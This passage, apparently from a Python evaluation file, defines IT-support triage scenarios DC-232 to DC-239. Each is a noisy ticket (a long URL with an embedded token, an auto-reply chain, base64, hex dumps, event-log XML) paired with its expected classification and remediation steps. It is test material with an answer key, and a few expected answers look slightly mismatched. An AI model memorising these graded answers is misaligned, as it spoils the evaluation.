                "&utm_source=email&utm_medium=weekly_digest&utm_campaign=compliance_q1_2026"
                "&utm_content=risk_overview_link&utm_term=regulatory_dashboard"
                "&token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjFhMmIzYzRkLTVlNmYtNzg5MC1hYmNkLWVmMTIzNDU2Nzg5MCJ9"
                ".eyJzdWIiOiJ1c2VyQGNvbnRvc28uY29tIiwibmFtZSI6Ikplbm5pZmVyIE1vcmdhbiIsImlhdCI6MTcxMTAwMDAwMCwiZXhwIjoxNzExMDAzNjAwLCJhdWQiOiJjb250b3NvLXNoYXJlcG9pbnQiLCJpc3MiOiJodHRwczovL3N0cy5jb250b3NvLmNvbSIsInNjb3BlIjoiU2l0ZXMuUmVhZC5BbGwgU2l0ZXMuV3JpdGUuQWxsIFVzZXIuUmVhZCJ9"
                ".dummysignaturepaddingtomakethisurllongerthantwo"
                "thousandcharacterswhichisneededtotriggertheedge"
                "caseweretestingherebecausemanybrowsersandproxies"
                "truncateurlslongerthantwothousandcharactersand"
                "thiscausesallsortsofinterestingfailuresinenterprise"
                "environmentswithlegacyproxiesandwafsandreverse"
                "proxiesthatdonothandlelongurlsgracefully"
                "&returnUrl=%2Fsites%2Fcompliance-dashboard%2FSitePages%2FHome.aspx"
                "&filter=region%3DUS-EAST%26status%3DOPEN%26priority%3DHIGH"
                "&debug=false&v=2026.03.18.1\n\n"
                "I've tried Chrome and Edge \u2014 same result. Other SharePoint sites "
                "work fine. I think the URL is too long because of all those tracking "
                "parameters and the embedded token. This dashboard is required for our "
                "weekly regulatory filing due Friday.\n\n"
                "\u2014 Jennifer Morgan\nCompliance"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate SharePoint compliance dashboard loading failure \u2014 "
                "likely caused by URL exceeding maximum length due to embedded JWT and UTM parameters."
            ),
            remediation_steps=[
                "Verify the URL length exceeds the proxy or WAF maximum URL limit.",
                "Remove unnecessary UTM tracking parameters from the dashboard link in the email digest.",
                "Move the session token from URL query parameter to an HTTP header or cookie.",
                "Test the dashboard loads correctly with a shortened URL.",
            ],
            reporter_name="Jennifer Morgan",
            reporter_email="jennifer.morgan@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "long-url", "query-param-overflow"],
            difficulty="medium",
        ),
        # ── DC-232  Multiple conflicting auto-reply headers ─────────────────
        ScenarioDefinition(
            scenario_id="DC-232",
            subject="Re: Re: Out of Office: Re: Auto: Out of Office: Network printer offline \u2014 Floor 12",
            description=(
                "Auto-Reply: I am currently out of the office with no access to email.\n"
                "For urgent matters, contact helpdesk@contoso.com.\n"
                "\u2014 David Kim, Portfolio Management\n\n"
                "--- Auto-Reply from Rebecca Torres ---\n"
                "Thank you for your message. I am out of the office until March 24, "
                "2026. For immediate assistance, please contact my backup, "
                "James O'Brien (james.obrien@contoso.com).\n\n"
                "--- Auto-Reply from James O'Brien ---\n"
                "I am currently in an all-day training session and will respond to "
                "emails after 5:00 PM ET. For urgent IT issues, please submit a "
                "ticket at https://helpdesk.contoso.internal.\n\n"
                "--- Original Message ---\n"
                "From: Maria Santos <maria.santos@contoso.com>\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "CC: David Kim; Rebecca Torres\n"
                "Subject: Network printer offline \u2014 Floor 12\n\n"
                "Hi IT Support,\n\n"
                "The network printer on Floor 12 (HP LaserJet MFP M634, asset tag "
                "PRN-NYC-1201) has been offline since this morning. It shows "
                "'Communication Error' on the display panel. IP address is "
                "10.12.40.50. We've tried power cycling it but it won't reconnect "
                "to the network. The entire floor (approx. 45 people) can't print.\n\n"
                "Thanks,\nMaria Santos\nClient Services"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate network printer PRN-NYC-1201 (10.12.40.50) communication "
                "error on Floor 12 \u2014 the real issue is buried under three auto-reply layers."
            ),
            remediation_steps=[
                "Ping 10.12.40.50 to confirm network reachability of the printer.",
                "Check the switch port and VLAN configuration for the printer's network drop.",
                "If the port is down, re-enable it and verify the printer obtains its IP via DHCP or static config.",
                "Test printing from a workstation on Floor 12 after connectivity is restored.",
            ],
            reporter_name="Maria Santos",
            reporter_email="maria.santos@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "auto-reply-chain", "ooo-noise"],
            difficulty="easy",
        ),
        # ── DC-233  Base64-encoded Excel binary data inlined ────────────────
        ScenarioDefinition(
            scenario_id="DC-233",
            subject="Monthly fee reconciliation file corrupted \u2014 need data recovery",
            description=(
                "Hi Data Platform team,\n\n"
                "The monthly fee reconciliation file got corrupted during upload to "
                "the SFTP server. I'm pasting the raw base64 of the original .xlsx "
                "file below so you can try to recover it:\n\n"
                "UEsDBBQAAAAIAGFiV1kAAAAAAAAAAAAAABIAHABbQ29udGVudF9UeXBlc10u\n"
                "eG1slc9NDoIwEAXgvYl3IN1aqQsXRuMBdC+hDFBT+kvn/t5WEBe68GfezJcv\n"
                "M5ut63b9rN8dMRNJKBHgLDBVRN1aZOKY7tY7IXhBZMjJMxECt97dS8lVC4Z4\n"
                "RQ4sT2riDYm/EBRCmAU/p+T9Xdc3T6ghHuCr96RYEFLyVkfI3Dlcp6HPg68R\n"
                "DGqKuI+f9FQ1ZBK+VZA+rDLcMi+cgyvs6b33kHHD4QuxQHa/AGa4VbL5D2C4\n"
                "h4dUcPIvPF/+oAxG0Ft3MmO4MjPdGQSdeMygRPHjHq+8RUzLjTgj2vQ/+4Xh\n"
                "S/fxGFRhRIKOiNB5rCGVRs0Y9A7sZNwdvDYUm4rYBNO2TfYN4R3Mq1JGShYR\n"
                "Q9mBxePjKZFnwzDz0IWeBDHJKpGEqR4+Kvy6NfFu4c7i3E5iPt6uf4BUEsDB\n"
                "BQAAAAIAYGJXWQAAAAAAAAAAAAAAAA8AHABfcmVscy8ucmVsc2WPzQrCMBCE\n"
                "7wXvEPZu0noQkab1IIKn0gcI7bYNtn/sRtG3N4igIHiZYb6ZYdL8PvbixqN3\n"
                "[... truncated \u2014 full file is 847KB of base64 ...]\n\n"
                "The file contains fee schedules for 12,000+ client accounts for "
                "March 2026. The SFTP upload log shows the transfer was interrupted "
                "at 68% completion.\n\n"
                "SFTP server: sftp-prod-02.contoso.internal\n"
                "Original file: /incoming/fees/2026-03-fee-recon.xlsx\n"
                "Upload time: 2026-03-17 23:15 UTC\n"
                "File size (expected): 634,218 bytes\n"
                "File size (received): 431,268 bytes\n\n"
                "\u2014 Owen Bradley\nFee Billing"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.SCREENSHOT_OR_ATTACHMENT, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Recover the corrupted fee reconciliation file from the source system "
                "and re-upload to sftp-prod-02 \u2014 the original transfer was interrupted at 68%."
            ),
            remediation_steps=[
                "Check the source system for the original complete copy of 2026-03-fee-recon.xlsx.",
                "Re-upload the complete file to sftp-prod-02.contoso.internal via a verified SFTP session.",
                "Validate the uploaded file size matches the expected 634,218 bytes.",
                "Run the fee reconciliation pipeline against the recovered file and verify output.",
            ],
            reporter_name="Owen Bradley",
            reporter_email="owen.bradley@contoso.com",
            reporter_department="Fee Billing",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "base64-binary-inline", "corrupted-attachment"],
            difficulty="medium",
        ),
        # ── DC-234  Terraform/Bicep IaC template pasted as description ──────
        ScenarioDefinition(
            scenario_id="DC-234",
            subject="Azure VM provisioning failing in DR region \u2014 Bicep template errors",
            description=(
                "Hi Cloud Infra team,\n\n"
                "Our DR failover VMs in East US 2 won't provision. Here's the Bicep "
                "template we're deploying:\n\n"
                "@description('DR environment virtual machines for trading platform')\n"
                "param location string = 'eastus2'\n"
                "param vmSize string = 'Standard_E16as_v5'\n"
                "param adminUsername string = 'contosoadmin'\n"
                "@secure()\n"
                "param adminPassword string\n"
                "param vnetResourceGroup string = 'rg-network-dr-eastus2'\n"
                "param subnetName string = 'snet-trading-dr'\n\n"
                "var vmNames = [\n"
                "  'vm-trade-dr-01'\n"
                "  'vm-trade-dr-02'\n"
                "  'vm-trade-dr-03'\n"
                "  'vm-trade-dr-04'\n"
                "]\n\n"
                "resource networkInterface"
                " 'Microsoft.Network/networkInterfaces@2023-09-01'"
                " = [for (vmName, i) in vmNames: {\n"
                "  name: 'nic-$${vmName}'\n"
                "  location: location\n"
                "  properties: {\n"
                "    ipConfigurations: [\n"
                "      {\n"
                "        name: 'ipconfig1'\n"
                "        properties: {\n"
                "          subnet: {\n"
                "            id: resourceId(vnetResourceGroup,"
                " 'Microsoft.Network/virtualNetworks/subnets',"
                " 'vnet-dr-eastus2', subnetName)\n"
                "          }\n"
                "          privateIPAllocationMethod: 'Dynamic'\n"
                "        }\n"
                "      }\n"
                "    ]\n"
                "  }\n"
                "}]\n\n"
                "resource virtualMachine"
                " 'Microsoft.Compute/virtualMachines@2023-09-01'"
                " = [for (vmName, i) in vmNames: {\n"
                "  name: vmName\n"
                "  location: location\n"
                "  properties: {\n"
                "    hardwareProfile: { vmSize: vmSize }\n"
                "    osProfile: {\n"
                "      computerName: vmName\n"
                "      adminUsername: adminUsername\n"
                "      adminPassword: adminPassword\n"
                "    }\n"
                "    storageProfile: {\n"
                "      imageReference: {\n"
                "        publisher: 'MicrosoftWindowsServer'\n"
                "        offer: 'WindowsServer'\n"
                "        sku: '2022-datacenter-g2'\n"
                "        version: 'latest'\n"
                "      }\n"
                "    }\n"
                "    networkProfile: {\n"
                "      networkInterfaces: [{ id: networkInterface[i].id }]\n"
                "    }\n"
                "  }\n"
                "}]\n\n"
                "Deployment error:\n"
                '"code": "InvalidTemplateDeployment",\n'
                '"message": "The template deployment failed with error: '
                "Subnet 'snet-trading-dr' not found in virtual network 'vnet-dr-eastus2' "
                "in resource group 'rg-network-dr-eastus2'.\"\n\n"
                "Correlation ID: 9f8e7d6c-5b4a-3210-fedc-ba9876543210\n\n"
                "We need the DR VMs online before the quarterly DR test on Friday.\n\n"
                "\u2014 Nadia Kowalski\nInfrastructure Engineering"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Create the missing subnet 'snet-trading-dr' in vnet-dr-eastus2 "
                "or correct the Bicep template to reference the correct subnet name."
            ),
            remediation_steps=[
                "Verify whether subnet 'snet-trading-dr' exists in vnet-dr-eastus2 in rg-network-dr-eastus2.",
                "If the subnet does not exist, create it with the appropriate address prefix.",
                "If the subnet name is different, update the Bicep template parameter to match.",
                "Re-deploy the Bicep template and verify all four DR VMs provision successfully.",
            ],
            reporter_name="Nadia Kowalski",
            reporter_email="nadia.kowalski@contoso.com",
            reporter_department="Infrastructure Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "iac-template-dump", "bicep-noise"],
            difficulty="hard",
        ),
        # ── DC-235  Git blame output pasted as ticket description ───────────
        ScenarioDefinition(
            scenario_id="DC-235",
            subject="Bug in trade settlement calculation \u2014 rounding error on FX conversion",
            description=(
                "Hi team,\n\n"
                "We found a rounding error in the FX settlement calculation. I ran "
                "git blame on the offending file to find out when it was introduced. "
                "Here's the output:\n\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  1) import decimal\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  2) from decimal import Decimal, ROUND_HALF_UP\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  3) \n"
                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500  4) FX_PRECISION = 4  # was 6\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  5) \n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  6) def convert_settlement_amount(\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  7)     amount: Decimal,\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  8)     fx_rate: Decimal,\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400  9)     target_ccy: str,\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 10) ) -> Decimal:\n"
                "c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 11)     # HOTFIX: round to FX_PRECISION\n"
                "c9d0e1f2 (Patel, Aisha    2026-01-20 11:00:00 -0500 12)     converted = amount * fx_rate\n"
                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 13)     rounded = converted.quantize(\n"
                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 14)         Decimal(10) ** -FX_PRECISION,\n"
                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 15)         rounding=ROUND_HALF_UP,\n"
                "e5f6a7b8 (Volkov, Elena   2025-11-02 14:15:00 -0500 16)     )\n"
                "a1b2c3d4 (Chen, Robert    2025-08-14 09:30:00 -0400 17)     return rounded\n\n"
                "The bug is on line 4 \u2014 commit e5f6a7b8 by Elena Volkov changed "
                "FX_PRECISION from 6 to 4 on 2025-11-02. This causes a rounding "
                "discrepancy of up to $0.01 per trade on JPY and KRW conversions, "
                "which compounds to ~$14,000/month in settlement differences.\n\n"
                "Service: trade-settlement-engine (repo: contoso/trade-settlement)\n"
                "File: src/fx/conversion.py\n"
                "Environment: prod (K8s namespace: prod-settlement)\n\n"
                "\u2014 James O'Brien\nTrade Settlement"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.BUSINESS_IMPACT, MissingInfo.REPRODUCTION_FREQUENCY],
            next_best_action=(
                "Revert FX_PRECISION from 4 back to 6 in src/fx/conversion.py and "
                "deploy a hotfix to resolve the $14K/month settlement rounding discrepancy."
            ),
            remediation_steps=[
                "Revert FX_PRECISION to 6 in src/fx/conversion.py (undo commit e5f6a7b8).",
                "Add unit tests for JPY and KRW FX conversion rounding at 6-digit precision.",
                "Deploy the fix to the prod-settlement namespace and verify settlement amounts.",
                "Reconcile the accumulated rounding differences for the affected period.",
            ],
            reporter_name="James O'Brien",
            reporter_email="james.obrien@contoso.com",
            reporter_department="Trade Settlement",
            channel=Channel.CHAT,
            tags=["data-cleanup", "git-blame-output", "source-code-noise"],
            difficulty="medium",
        ),
        # ── DC-236  Massive pasted document text ────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-236",
            subject="Cannot access Compliance Policy Library on SharePoint",
            description=(
                "Hi IT Support,\n\n"
                "I need help accessing a document in the Compliance Policy Library. "
                "Here is the full text of the document I was trying to read so you "
                "can understand what I need:\n\n"
                "=== CONTOSO CORPORATION — COMPLIANCE POLICY FRAMEWORK ===\n"
                "Document ID: CPF-2026-0041 | Version 3.2 | Effective Date: January 1, 2026\n"
                "Classification: Internal — Restricted Distribution\n\n"
                "SECTION 1: DATA RETENTION AND DISPOSAL\n"
                "1.1 All electronic records pertaining to client transactions shall be "
                "retained for a minimum period of seven (7) years from the date of "
                "creation, in accordance with SEC Rule 17a-4 and FINRA Rule 4511.\n"
                "1.2 Records classified as Tier 1 (client-facing communications, trade "
                "confirmations, and account statements) must be stored in immutable "
                "WORM-compliant storage with cryptographic integrity verification.\n"
                "1.3 Disposal of records beyond the retention period requires written "
                "approval from the Chief Compliance Officer and must be documented in "
                "the Records Disposal Register (Appendix C-4).\n\n"
                "SECTION 2: ACCESS CONTROLS AND AUTHORIZATION\n"
                "2.1 Access to compliance records shall be granted on a need-to-know "
                "basis following the principle of least privilege as defined in NIST "
                "SP 800-53 AC-6.\n"
                "2.2 All access requests must be submitted through the Compliance Access "
                "Request Portal (CARP) and approved by the department head and the "
                "Compliance Technology team within five (5) business days.\n"
                "2.3 Privileged access to the Compliance Policy Library requires "
                "multi-factor authentication (MFA) using a hardware token or biometric "
                "factor in addition to standard Active Directory credentials.\n\n"
                "SECTION 3: AUDIT REQUIREMENTS\n"
                "3.1 The Compliance Technology team shall conduct quarterly access "
                "reviews of all compliance record repositories to ensure adherence "
                "to the authorization matrix defined in Appendix A-2.\n"
                "3.2 Any unauthorized access attempts must be reported to the Security "
                "Operations Center (SOC) within four (4) hours of detection and "
                "documented in the Incident Register.\n"
                "3.3 Annual penetration testing of compliance record storage systems "
                "shall be performed by an independent third-party assessor approved "
                "by the Audit Committee.\n\n"
                "SECTION 4: CROSS-BORDER DATA TRANSFER\n"
                "4.1 Transfer of compliance records across jurisdictional boundaries "
                "must comply with applicable data protection regulations including "
                "GDPR Article 46, CCPA Section 1798.140, and the APAC Data Localization "
                "Framework adopted by the firm in 2025.\n"
                "4.2 Standard Contractual Clauses (SCCs) must be executed with any "
                "third-party processor receiving compliance data across borders.\n\n"
                "SECTION 5: INCIDENT RESPONSE FOR COMPLIANCE DATA BREACHES\n"
                "5.1 In the event of a breach involving compliance-regulated data, the "
                "Incident Response Team shall be activated within thirty (30) minutes "
                "following the notification protocol defined in Appendix D-1.\n"
                "5.2 Regulatory notification obligations under SEC, FINRA, and state "
                "privacy laws shall be assessed by Legal and Compliance within 24 hours.\n\n"
                "=== END OF DOCUMENT ===\n\n"
                "Anyway, I keep getting a 403 Forbidden error when I click the Compliance "
                "Policy Library link on SharePoint. It worked fine before the migration "
                "last Friday. Can you help?\n\n"
                "— Nina Vasquez\nCompliance"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate SharePoint 403 error for Compliance Policy Library after "
                "migration — likely a permissions issue from the site migration. Ignore "
                "the pasted document content."
            ),
            remediation_steps=[
                "Check SharePoint site permissions for the migrated library.",
                "Verify the user's group membership includes the new site collection.",
                "Re-grant access if permissions were not migrated.",
                "Test access with the user's account after fixing permissions.",
            ],
            reporter_name="Nina Vasquez",
            reporter_email="nina.vasquez@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "massive-pasted-document", "buried-issue"],
            difficulty="hard",
        ),
        # ── DC-237  Embedded SVG image data with XML markup ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-237",
            subject="Monitor color profile looks wrong after driver update",
            description=(
                "Hi,\n\n"
                "My monitor colors look completely wrong after the last GPU driver update. "
                "I tried to take a screenshot to show you but it came through as raw SVG "
                "data somehow:\n\n"
                '<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" '
                'viewBox="0 0 1920 1080">\n'
                "  <defs>\n"
                '    <linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="0%">\n'
                '      <stop offset="0%" style="stop-color:rgb(255,0,0);stop-opacity:1"/>\n'
                '      <stop offset="50%" style="stop-color:rgb(0,255,0);stop-opacity:1"/>\n'
                '      <stop offset="100%" style="stop-color:rgb(0,0,255);stop-opacity:1"/>\n'
                "    </linearGradient>\n"
                '    <linearGradient id="g2" x1="0%" y1="0%" x2="0%" y2="100%">\n'
                '      <stop offset="0%" style="stop-color:rgb(255,255,255);stop-opacity:1"/>\n'
                '      <stop offset="100%" style="stop-color:rgb(0,0,0);stop-opacity:1"/>\n'
                "    </linearGradient>\n"
                '    <radialGradient id="rg1" cx="50%" cy="50%" r="50%">\n'
                '      <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:0.8"/>\n'
                '      <stop offset="100%" style="stop-color:rgb(128,0,128);stop-opacity:0.3"/>\n'
                "    </radialGradient>\n"
                "  </defs>\n"
                '  <rect width="1920" height="1080" fill="url(#g1)"/>\n'
                '  <rect width="1920" height="1080" fill="url(#g2)" opacity="0.5"/>\n'
                '  <circle cx="960" cy="540" r="400" fill="url(#rg1)"/>\n'
                '  <text x="50" y="50" font-family="Arial" font-size="24" fill="#FFFFFF">'
                "Color calibration test pattern — sRGB reference</text>\n"
                '  <rect x="100" y="900" width="120" height="80" fill="#FF0000"/>\n'
                '  <rect x="240" y="900" width="120" height="80" fill="#00FF00"/>\n'
                '  <rect x="380" y="900" width="120" height="80" fill="#0000FF"/>\n'
                '  <rect x="520" y="900" width="120" height="80" fill="#FFFF00"/>\n'
                '  <rect x="660" y="900" width="120" height="80" fill="#FF00FF"/>\n'
                '  <rect x="800" y="900" width="120" height="80" fill="#00FFFF"/>\n'
                '  <text x="100" y="1000" font-family="Consolas" font-size="12" fill="#FFFFFF">'
                "R:255 G:0 B:0</text>\n"
                '  <text x="240" y="1000" font-family="Consolas" font-size="12" fill="#FFFFFF">'
                "R:0 G:255 B:0</text>\n"
                '  <text x="380" y="1000" font-family="Consolas" font-size="12" fill="#FFFFFF">'
                "R:0 G:0 B:255</text>\n"
                "</svg>\n\n"
                "After updating the NVIDIA GPU driver to version 550.67, my Dell U2722D "
                "monitor's color profile shifted to a blue-ish tint. The sRGB mode looks "
                "washed out.\n\n"
                "— Carlos Mendez\nDesign"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate monitor color profile shift after NVIDIA driver update to "
                "v550.67 — likely need to reapply the ICC color profile or roll back the driver."
            ),
            remediation_steps=[
                "Check current ICC color profile and reapply the Dell U2722D sRGB profile.",
                "Try rolling back the NVIDIA driver from 550.67 to the previous version.",
                "Verify display color settings in NVIDIA Control Panel.",
                "If issue persists replace the docking station display cable.",
            ],
            reporter_name="Carlos Mendez",
            reporter_email="carlos.mendez@contoso.com",
            reporter_department="Design",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "embedded-svg", "xml-data-inline"],
            difficulty="hard",
        ),
        # ── DC-238  Hex dump of network packet capture ──────────────────────────
        ScenarioDefinition(
            scenario_id="DC-238",
            subject="Intermittent packet loss on trading floor — packet capture attached",
            description=(
                "Hi Network Team,\n\n"
                "We have been seeing packet loss on the trading floor. I captured some "
                "packets with Wireshark and pasted the hex dump below:\n\n"
                "0000  00 1a 2b 3c 4d 5e 00 0c 29 8a 1b 2c 08 00 45 00  ..+<M^..)..,.E.\n"
                "0010  00 3c 1c 46 40 00 40 06 b1 e6 c0 a8 01 64 ac 10  .<.F@.@......d..\n"
                "0020  01 01 c0 23 01 bb a3 4f 7d 8e 00 00 00 00 a0 02  ...#...O}.......\n"
                "0030  fa f0 3c 5d 00 00 02 04 05 b4 04 02 08 0a 00 9c  ..<]............\n"
                "0040  27 24 00 00 00 00 01 03 03 07 00 00 00 00 00 00  '$..............\n"
                "0050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n"
                "0000  00 0c 29 8a 1b 2c 00 1a 2b 3c 4d 5e 08 00 45 00  ..)..,.+<M^..E.\n"
                "0010  00 3c 00 00 40 00 3f 06 ce 2c ac 10 01 01 c0 a8  .<..@.?..,.....\n"
                "0020  01 64 01 bb c0 23 5f 2a 1e 90 a3 4f 7d 8f a0 12  .d...#_*...O}...\n"
                "0030  71 20 94 52 00 00 02 04 05 b4 04 02 08 0a 01 e2  q .R............\n"
                "0040  38 4c 00 9c 27 24 01 03 03 07 00 00 00 00 00 00  8L..'$..........\n"
                "0050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n"
                "0000  00 1a 2b 3c 4d 5e 00 0c 29 8a 1b 2c 08 00 45 00  ..+<M^..)..,.E.\n"
                "0010  00 28 1c 47 40 00 40 06 b1 f9 c0 a8 01 64 ac 10  .(.G@.@......d..\n"
                "0020  01 01 c0 23 01 bb a3 4f 7d 8f 5f 2a 1e 91 50 10  ...#...O}._*..P.\n"
                "0030  fa f0 99 1b 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n"
                "0000  00 1a 2b 3c 4d 5e 00 0c 29 8a 1b 2c 08 00 45 00  ..+<M^..)..,.E.\n"
                "0010  01 a2 1c 48 40 00 40 06 b0 7e c0 a8 01 64 ac 10  ...H@.@..~...d..\n"
                "0020  01 01 c0 23 01 bb a3 4f 7d 8f 5f 2a 1e 91 50 18  ...#...O}._*..P.\n"
                "0030  fa f0 d7 3a 00 00 16 03 01 01 75 01 00 01 71 03  ...:......u...q.\n"
                "0040  03 e7 b2 4a 91 c5 38 22 df 8a 9e 16 ab 7c 3e f1  ...J..8\"....|>.\n"
                "0050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n"
                "[... 847 more packets omitted for brevity ...]\n\n"
                "Every day between 14:00 and 14:15 UTC we see 5-8% packet loss on the "
                "trading floor VLAN 210. It's affecting FIX protocol connections to the "
                "exchange.\n\n"
                "— Marcus Thompson\nEquity Trading"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate scheduled packet loss on VLAN 210 between 14:00-14:15 UTC — "
                "correlate with network device logs and scheduled tasks on the trading floor switches."
            ),
            remediation_steps=[
                "Review switch logs for VLAN 210 during the 14:00-14:15 window.",
                "Check for scheduled backup jobs or batch processes that may saturate the link.",
                "Analyze QoS configuration to ensure FIX protocol traffic has appropriate priority.",
                "If a congestion issue verify uplink capacity and consider traffic engineering.",
            ],
            reporter_name="Marcus Thompson",
            reporter_email="marcus.thompson@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "hex-dump", "network-capture"],
            difficulty="hard",
        ),
        # ── DC-239  Windows Event Log XML dump ──────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-239",
            subject="Blue screen on my laptop — Event Viewer export attached",
            description=(
                "Hi IT,\n\n"
                "My laptop blue-screened twice today. I exported the crash events from "
                "Event Viewer:\n\n"
                '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
                "  <System>\n"
                '    <Provider Name="Microsoft-Windows-WER-SystemErrorReporting" '
                'Guid="{ABCE23E7-DE45-4366-8631-84FA6C525952}"/>\n'
                "    <EventID>1001</EventID>\n"
                "    <Version>0</Version>\n"
                "    <Level>2</Level>\n"
                "    <Task>0</Task>\n"
                "    <Opcode>0</Opcode>\n"
                "    <Keywords>0x8000000000000080</Keywords>\n"
                '    <TimeCreated SystemTime="2026-03-17T14:22:35.1234567Z"/>\n'
                "    <EventRecordID>98765</EventRecordID>\n"
                "    <Correlation/>\n"
                '    <Execution ProcessID="0" ThreadID="0"/>\n'
                "    <Channel>System</Channel>\n"
                "    <Computer>DESKTOP-PRY4S21.contoso.com</Computer>\n"
                '    <Security UserID="S-1-5-18"/>\n'
                "  </System>\n"
                "  <EventData>\n"
                '    <Data Name="param1">0x000000d1 (DRIVER_IRQL_NOT_LESS_OR_EQUAL)</Data>\n'
                '    <Data Name="param2">0xfffff80742301abc</Data>\n'
                '    <Data Name="param3">0x0000000000000002</Data>\n'
                '    <Data Name="param4">0xfffff80742301abc</Data>\n'
                '    <Data Name="param5">usbhub3.sys</Data>\n'
                '    <Data Name="param6">10.0.22621.2506</Data>\n'
                '    <Data Name="param7">2026-03-17T14:22:30.0000000Z</Data>\n'
                '    <Data Name="param8">C:\\Windows\\Minidump\\031726-12345-01.dmp</Data>\n'
                '    <Data Name="param9">C:\\Windows\\MEMORY.DMP</Data>\n'
                "  </EventData>\n"
                "</Event>\n\n"
                '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
                "  <System>\n"
                '    <Provider Name="Microsoft-Windows-Kernel-Power" '
                'Guid="{331C3B3A-2005-44C2-AC5E-77220C37D6B4}"/>\n'
                "    <EventID>41</EventID>\n"
                "    <Version>6</Version>\n"
                "    <Level>1</Level>\n"
                "    <Task>63</Task>\n"
                "    <Opcode>0</Opcode>\n"
                "    <Keywords>0x8000400000000002</Keywords>\n"
                '    <TimeCreated SystemTime="2026-03-17T14:23:01.9876543Z"/>\n'
                "    <EventRecordID>98766</EventRecordID>\n"
                "    <Channel>System</Channel>\n"
                "    <Computer>DESKTOP-PRY4S21.contoso.com</Computer>\n"
                "  </System>\n"
                "  <EventData>\n"
                '    <Data Name="BugcheckCode">209</Data>\n'
                '    <Data Name="BugcheckParameter1">0xfffff80742301abc</Data>\n'
                '    <Data Name="SleepInProgress">0</Data>\n'
                '    <Data Name="PowerButtonTimestamp">0</Data>\n'
                "  </EventData>\n"
                "</Event>\n\n"
                "My laptop blue-screened twice today with DRIVER_IRQL_NOT_LESS_OR_EQUAL. "
                "Both times it happened when I plugged in my USB-C docking station.\n\n"
                "— Priya Sharma\nRisk Management"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.REPRODUCTION_FREQUENCY],
            next_best_action=(
                "Investigate DRIVER_IRQL_NOT_LESS_OR_EQUAL BSOD triggered by USB-C docking "
                "station connection — likely a driver conflict with the dock's display or "
                "Ethernet adapter."
            ),
            remediation_steps=[
                "Check the minidump files (C:\\Windows\\Minidump) for the faulting driver name.",
                "Update the docking station firmware and related USB-C drivers.",
                "If a specific driver is identified roll it back to the previous version.",
